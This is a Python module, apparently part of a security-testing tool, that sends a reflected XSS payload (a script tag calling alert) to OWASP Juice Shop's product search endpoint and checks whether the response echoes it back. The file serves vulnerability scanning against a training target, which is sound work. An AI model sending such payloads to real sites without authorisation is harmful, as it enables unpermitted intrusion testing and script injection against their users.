from __future__ import annotations

import urllib.parse

from ..core.base_module import BaseModule
from ..core.models import FindingResult, Severity

# Reflected XSS via Juice Shop's product search endpoint.
# The payload is URL-encoded for the GET query param but kept unmodified in evidence.
_RAW_PAYLOAD = "<script>alert('AegisLoop_XSS')</script>"
_ENDPOINT = "/rest/products/search"


class ReflectedXSSModule(BaseModule):
    technique_id = "T1059.007"
    technique_name = "Command and Scripting Interpreter: JavaScript (Reflected XSS)"
    owasp_category = "A03:2021-Injection (XSS)"
    severity = Severity.HIGH
    cvss_score = 7.2

    def execute(self) -> FindingResult:
        self.log.info("Probing %s with reflected XSS payload", _ENDPOINT)
        encoded = urllib.parse.quote(_RAW_PAYLOAD, safe="")
        path = f"{_ENDPOINT}?q={encoded}"

        resp, elapsed, error = self._request("GET", path)
        result = self._build_result(_RAW_PAYLOAD, _ENDPOINT, resp, elapsed, error)

        if resp and resp.status_code == 200:
            body = resp.text
            if _RAW_PAYLOAD in body or "alert(" in body:
                result.evidence = "Raw XSS payload reflected verbatim in server response body."

        return result
